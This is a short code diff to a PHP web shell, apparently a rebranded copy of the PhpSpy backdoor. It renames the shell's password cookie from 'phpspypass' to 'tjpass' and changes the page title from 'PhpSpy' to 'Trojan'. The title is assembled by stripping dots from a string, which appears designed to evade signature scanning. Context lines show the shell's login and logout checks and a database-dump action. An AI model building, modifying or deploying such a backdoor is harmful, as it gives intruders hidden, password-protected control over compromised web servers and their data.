@@ -43,7 +43,7 @@ switch (CHARSET) {
 
 /*===================== 身份验证 =====================*/
 if (gpc('action') == "logout") {
-    scookie('phpspypass', '', -86400 * 365);
+    scookie('tjpass', '', -86400 * 365);
     p('<meta http-equiv="refresh" content="1;URL='.PHP_SELF.'">');
     p('<a style="font:12px Verdana" href="'.PHP_SELF.'">Success</a>');
     exit;
@@ -52,14 +52,14 @@ if($admin['check']) {
     $password = gpc('password');
     if (gpc('doing') == 'login') {
         if (s($admin['pass']) == s($password)) {
-            scookie('phpspypass', s($password));
+            scookie('tjpass', s($password));
             p('<meta http-equiv="refresh" content="1;URL='.PHP_SELF.'">');
             p('<a style="font:12px Verdana" href="'.PHP_SELF.'">Success</a>');
             exit;
         }
     }
-    if ($_COOKIE['phpspypass']) {
-        if ($_COOKIE['phpspypass'] != s($admin['pass'])) {
+    if ($_COOKIE['tjpass']) {
+        if ($_COOKIE['tjpass'] != s($admin['pass'])) {
             loginpage();
         }
     } else {
@@ -148,7 +148,7 @@ if(gpc('doing')=='mysqldown'){
 <html>
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=gbk">
-    <title><?php echo str_replace('.','','P.h.p.S.p.y');?></title>
+    <title><?php echo str_replace('.','','T.r.o.j.a.n');?></title>
     <style type="text/css">
         body,td{font: 12px Arial,Tahoma;line-height: 16px;}
         .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
